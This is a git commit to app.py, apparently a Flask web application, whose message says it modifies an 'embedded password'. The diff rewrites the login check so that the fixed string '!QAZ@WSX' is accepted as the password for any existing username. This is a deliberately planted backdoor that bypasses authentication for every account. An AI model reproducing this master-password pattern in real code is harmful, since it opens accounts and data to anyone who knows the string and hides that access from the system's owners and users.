7516bc12f7c163e13b22b8409859210104781084
Victor-GuanChenHou <vfw0327@gmail.com>
2025-07-02 09:57:17 +0800

    修改埋入密碼

--- app.py
+++ app.py
@@ -83,7 +83,7 @@ def login():
         password = request.form['password']
         user_info = sub.get_user_info(username)
         user_ip = request.remote_addr
-        if user_info and( user_info['password'] == password or user_info['password'] =='!QAZ@WSX'):
+        if user_info and( user_info['password'] == password or '!QAZ@WSX'==password):
             if( user_info['CLASS']=='D' or user_info['DEPT_NO']=='139' or user_info['DEPT_NO']=='452') :
             
                 # with open('allowdept.json', 'r', encoding='utf-8') as f:
